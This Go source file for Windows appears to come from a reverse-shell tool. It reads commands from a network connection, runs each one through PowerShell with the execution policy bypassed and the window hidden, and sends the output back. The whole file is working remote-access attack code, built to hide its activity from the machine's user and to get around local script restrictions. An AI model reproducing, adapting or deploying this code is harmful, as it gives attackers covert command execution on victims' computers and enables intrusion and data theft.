//go:build windows

package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"net"
	"os/exec"
	"strings"
	"syscall"
)

func unixReverseShell(conn net.Conn, interactive bool, encryptor *StringEncryptor) error {
	return nil // not used on Windows
}

func windowsReverseShell(conn net.Conn, encryptor *StringEncryptor) error {
	defer conn.Close()

	reader := bufio.NewReader(conn)

	for {
		// Read command
		command, err := reader.ReadString('\n')
		if err != nil {
			if err == io.EOF {
				return nil
			}
			return fmt.Errorf("command reading error: %v", err)
		}

		command = strings.TrimSpace(command)
		if command == "" {
			continue
		}

		// Close session with exit command
		if command == "exit" {
			conn.Write([]byte("[!] Shell closed.\r\n"))
			return nil
		}

		// Execute command
		output, err := executeCommand(command)
		if err != nil {
			conn.Write([]byte(fmt.Sprintf("[X] Error: %s\r\n", err)))
			continue
		}

		// Send output
		conn.Write(output)
	}
}

func executeCommand(cmd string) ([]byte, error) {
	command := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd)

	// Don't open window on Windows:
	command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	var out bytes.Buffer
	command.Stdout = &out
	command.Stderr = &out

	err := command.Run()
	return out.Bytes(), err
}
